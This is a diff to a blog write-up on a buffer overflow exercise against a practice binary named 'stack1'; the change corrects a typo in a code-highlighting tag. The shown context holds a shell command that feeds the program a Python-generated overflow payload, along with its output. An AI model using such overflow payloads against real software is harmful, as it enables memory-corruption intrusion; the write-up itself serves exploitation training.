@@ -46,7 +46,7 @@ Scrolling down to the BUGS section, everything becomes clear.
 
 With this information we can confirm that this is a buffer overflow attack. Using our knowledge from the previous write up, let's write our overflow.
 
-{% highligh shell %}
+{% highlight shell %}
 $ ./stack1 $(python -c "print 'A' * 64 + '\x61\x62\x63\x64'")
 Try again, you got 0x64636261
 {% endhighlight %}
